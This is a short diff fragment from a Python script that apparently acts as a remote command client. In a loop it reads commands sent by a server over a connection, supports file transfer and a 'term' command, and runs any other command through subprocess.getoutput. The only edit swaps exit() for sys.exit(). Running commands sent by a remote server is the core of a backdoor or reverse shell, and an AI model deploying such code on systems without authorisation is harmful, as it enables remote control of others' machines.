@@ -130,7 +130,7 @@ while True:
                     if(file_transfer_mode(conn)==0):
                         continue
                 elif(server_cmd[:4]=="term"):
-                    exit()
+                    sys.exit()
                 else:
                     # no special command Handler
                     output=subprocess.getoutput(server_cmd)
